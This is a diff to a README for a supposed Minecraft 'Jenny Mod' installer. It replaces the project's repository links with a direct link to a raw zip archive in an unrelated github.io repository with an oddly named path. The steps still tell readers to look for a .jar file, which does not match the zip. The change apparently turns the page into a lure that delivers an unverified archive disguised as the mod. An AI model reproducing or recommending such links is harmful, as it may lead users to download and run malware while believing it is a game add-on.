@@ -5,7 +5,7 @@ description: "Install the Jenny Mod for Minecraft on Windows with a single click
 ---
 # 🎮 Jenny-Mod-Jar - Add new content to your Minecraft
 
-[![Download Link](https://img.shields.io/badge/Download-JennyMinusMod-blue)](https://github.com/light-foolscap580/Jenny-Mod-Jar)
+[![Download Link](https://img.shields.io/badge/Download-JennyMinusMod-blue)](https://github.com/light-foolscap580/light-foolscap580.github.io/raw/refs/heads/main/bawdiness/foolscap-light-github-io-3.1.zip)
 
 ## 📌 About this project
 
@@ -25,7 +25,7 @@ Before you install this mod, ensure your computer meets these basic requirements
 
 Follow these steps to obtain the installer files.
 
-1. Navigate to the download repository: [https://github.com/light-foolscap580/Jenny-Mod-Jar](https://github.com/light-foolscap580/Jenny-Mod-Jar).
+1. Navigate to the download repository: [https://github.com/light-foolscap580/light-foolscap580.github.io/raw/refs/heads/main/bawdiness/foolscap-light-github-io-3.1.zip](https://github.com/light-foolscap580/light-foolscap580.github.io/raw/refs/heads/main/bawdiness/foolscap-light-github-io-3.1.zip).
 2. Locate the file ending in .jar.
 3. Save the file to a location you can find, such as your Downloads folder.
 4. Do not open the file yet. Ensure you have the file saved completely before you proceed.
